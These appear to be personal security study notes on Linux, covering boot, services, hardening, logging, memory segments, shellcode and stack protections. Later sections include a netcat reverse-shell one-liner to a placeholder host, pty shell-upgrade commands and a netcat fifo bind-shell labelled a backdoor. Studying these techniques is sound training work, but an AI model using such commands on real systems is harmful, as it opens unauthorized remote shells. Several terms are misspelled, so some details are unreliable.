Linux is a open source operation system.

Linux distribution 
	Ubuntu 
		Based on Debian Linux
	Fedora 
		Based on Redhat Linux

Unix system boot 
	-	First boot loader is executed in order to prepare the system to begin executing the Unix kernel code
	-	Kernel initialization and execution 
	-	Initial processes (init)
	-	Init run system start-up scripts
	
[[SSH]]
Is the most common way to interact with a linux with remote command tools 
[[SSH#^134d5d]]

The key elements of Unix
	-	Kernel : Memory resident part of the operating system, is the most important part of the Unix or any OS without kernel the OS does not function. It responsible for instructions to hardware and software. Kernel is loaded into memory at boot up. This allows faster interaction between all components. It must have a dedicated space in memory to reside without shifting. 
	-	Shell : The portion of the operating system with which users and process interact directly, Shell is the command line interpreter that uses to run programs on the computer, it provides user with interface to the system. 
	-	Hardware : Collection of components which house our data and provide means to communicate 
	
Services
	Services are started in one of four ways, at boot, by inetd/xinetd, Cron and command-line. 
	-	Init processes is started at boot, it tells the system what must be running until shutdown.
	-	Inted starts network services when there is a request for them. Xinetd is the extender of inted which allows the system to perform security checks, like limit hosts that can connect, prevent DOS attacks, etc. 
	-	Cron is similar to schedule task in windows [[Windows#^schedule]]
	
	
Security 
 The process to take to protect the OS. 
 -	Protect OS Binaries in /user, Typically the binaries that the attacker repaces are OS programs in the /user/bin and /usr/sbin directories, so protecting the /user file system is important. 
 -	Stop creating or bringing unauthorized set-UID and set-GID programs on the machine. 
 -	Raise alert if new or unexpected SUID/SGID programs appear. 
 -	Unix have two classes of users: normal who can only manipulate their own data, and superuser who can do anything to any object on the system. Unix comes with number of accounts that are associated with particular application on the system, it important to disable the accounts if the service or app is not used. 
 -	Passwd file contains the permissions and home directory. 
 -	Shadow is were the encrypted password is stored 
 -	Securing boot loader with password. (requires physical access to machine if rebooted)
 -	Tcpwrappers, all connection must pass thru a set of rules before being allowed to connect to a service. 
 -	Service should be deleted if not needed, even if they are disabled, they should still be kept up to date. 
	
Security enhancement 
	-	Bastille Linux will explain the issue and optionally fix them. The perl script inspects the system for common security mistakes. with each one, Bastille explains what the issue is, why it should be fixed and what side effects the fix might have. 
	-	[[snort]]
	-	SELinux enhance the default discretionary access control security of Unix system with the inclusion and management of a mandatory access control security effort. It allows administrators the ability to control all interactions of software on the system. 
	-	AppArmor is interchangeable with SELinux, it is seens as an easier alternative. 
	
## Log
-	UTMP log keeps tracks of users currently logged into the system.
-	WTMP log records user logon events.
-	Lastlog recoards users most recent login information.
-	SULOG is used to log the use of the switch user command (su).
-	SYSLOG record major events that take place on the system. including attempt to use su and failed login attempts.  Syslog.conf contains information on logs and location of the logs on the system. 
	
### Syslog
Accept messages over the network from any host that is able to reach the server. that means an attackers can continuously send a large volume of messages at the syslog until it either overwhelmed and cannot log any messages or filling up the disk. 
Syslog-NG is a replacemtn for the traditional syslog it allows the the ability to filter packages and the support for windows. 
	
[[Patch management]]
	-	Apt is DEbians patching tool, allows for automated patching on Debian based Unix system. 
	-	yum is the smart software installation too for centos and other Linux distributions. when asked to install or upgrade a package, yum knows how to identify and install any supporting packages. for example , if you install a new spell checking program, yum would know how to find and install the needed dictionary. Before yum, the administrator was often given an error message about missing dictionary that didn't event list what package contained the needed file. 
	
	
	
	

	

## Memory 
Physical memory; [[RAM]]
processor registers look as hard-coded variables. The fastest for the processor to access. 
	
Processor Cache is used by the CPU to quickly access instructions and data from memory  Consists of L caches. The closer you get to L1 the smaller the cache is, but also faster to fetch. 

Paging is performed when the system runs out of memory. The system will copy pages not recently accessed to the hard disk in a area set up as swap space. There by freeing up resources. 
Paging is the process of allowing indirect memory mapping. Linear addressing is mapped into fixed sized pages, most commonly 4KB, Pages mapped into page tables with up to 1024 entries. 
Object files.

When high-level programming language such as C or C++ is compiled into object code. This is the representation of the program in binary machine code format. Object file can consists of multiple components. During runtime multiple segments are mapped in memory the prim segments let us walk through each one of the segments so we may further lay a foundation. 

Stack segment short finite operations with predefined buffer sizes rightfully belong on the stack. 

LIFO (Last in, First out)

cdecl caller paces parameters, the called function from right to left and the caller tears down the stack

stdall, Parameters placed by caller from right to left and the called function is responsible for tearing down the stack

GNU Debugger 
	that run on UNIX OS, will attach to a process
	Similar tool for windows is called MinGW 
		
Syntax
	AT%T syntax
		Source, then destination, eg. mov $4,%eax would copy value 4 into eax. 
		last character in operands tell the size b = byte, w = word, l = long
	Intel syntax 
		Destination, then source
		
Linkers & Loader
	Linker link function name to actual location.
	Loader load a program from storage to memory.

objdump used to disassemble object files. 

readelf, display ELF object file information
		
Dynamic memory 
	Heap performing large memory allocation to hold user data or run rick content will utilize heap. Opening multiple Word documents would find the data on the heap. The heap is designed to border a large unused memory segment to allow it to grow without interfering with other memory segments . 
	Once a program is loaded into memory, EIP holds the address for the first instruction in the code segment to start the program, also known as the program entry point. The code segment is often loaded at lower memory addresses than other segments. The data segment stores global and static variables used  by the program. With some implementations you will see other segments loaded that could potentially divide up the types of data in the data segment. The BSS segment stores uninitialized variables that may not be needed by the program, or that will remain uninitialized until they are referenced. 
	Following the BSS segment is where the heap segment begins for example a web browser need to load an image on a page. memory must be allocated on the heap at this point in order to store the image in memory. The heap grows from lower memory addressing towards the stack segment. starting at a much higher memory address.  ^Memory


## Shellcode 
It primarily used to spawn a shell. Shellcode is usually written in assembly and then assembled into machine code by tools such as netwide assembler. Nowadays it used to thing under the right of the program being compromised. A common usage of shellcode is to bind a shell listening port on the system, add user, dll injection. 
null bytes must not be part of the shell code, because if function hit a null byte it will be translated to a string terminator, causing the shell code to fail. ^Shellcode


Smashing the stack 
4 byte value before the return pointer. UNIX = canary, win Security cookie. 

Terminator canary
Random Canary
Null Canary 

Linux Address space layout randomization (ASLR) 
The primary objective of ASLR and other compile-time controls is to protect programs from being exploited by attackers. one method is to make eligible pages of memory non-writable or non-executable. 
tool: Idd List dynamic dependencies 
Ret to ESP 
	jmp/call esp
ret to exa
	jmp/call exa
ret to ret
	return repeatedly down the stack
ret to ptr
	registers hold addresses on the stack we can control 
	
Upgrade shell : 
	python3 -c "import pty; pty.spawn('/bin/bash')" (check what version of python is installed or install python)
	python -c "import pty; pty.spawn('/bin/bash')"
	nc @IP @Port -e /bin/bash
	
 [[Privilege escalation#^ebeddb]]
		
## Logs 
Linux uses Syslog itself is the protocol used to transport messages from network devices to a server that logs them. The log files on a syslog server are the main source of information about the operation and performance of network devices and other resources and are frequently used to identify and debug issues.

## File

In the above command we are creating a netcat listener that forwards all input through a backpipe and then into a bash session. It then takes the output of the bash session and puts it back into the netcat listener.

### CLI 
using & at the end of the command allow you to execute additional commands. 
fx python -m SimpleHTTPServer 8000 &

#### Sudo
**sudo** can be used with additional options:

-   **-h** – help; displays syntax and command options
-   **-V** – version; displays the current version of the sudo application
-   **-v** – validate; refresh the time limit on sudo without running a command
-   **-l** – list; lists the user’s privileges, or checks a specific command
-   **-k** – kill; end the current sudo privileges

ps -ef | grep <pid>
	You can find the pid value next to the suspicious connection under the Process column. Use that pid to identify the process with ps -ef
	
#### strings	
	Want to see the text inside a binary or data file?  The Linux `strings` command pulls those bits of text—called “strings”—out for you.
	
#### Fish
	[doc](https://fishshell.com/)
	
#### fifo backdoor
first in first out
We will next need to create a fifo backpipe:
```Bash
mknod backpipe p
```
Next, let's start the backdoor:
```Bash
/bin/bash 0<backpipe | nc -l 2222 1>backpipe
```

	
#### cheatsheet 
	https://wiki.sans.blue/Tools/pdfs/LinuxCLI101.pdf
	https://wiki.sans.blue/Tools/pdfs/LinuxCLI.pdf
	https://digital-forensics.sans.org/media/linux-shell-survival-guide.pdf?msc=Cheat+Sheet+Blog
	https://assets.contentstack.io/v3/assets/blt36c2e63521272fdc/blta6a2ae64ec0ed535/5eb08aaeead3926127b4df44/SMB-Access-from-Linux.pdf
	https://digital-forensics.sans.org/media/remnux-malware-analysis-tips.pdf?msc=Cheat+Sheet+Blog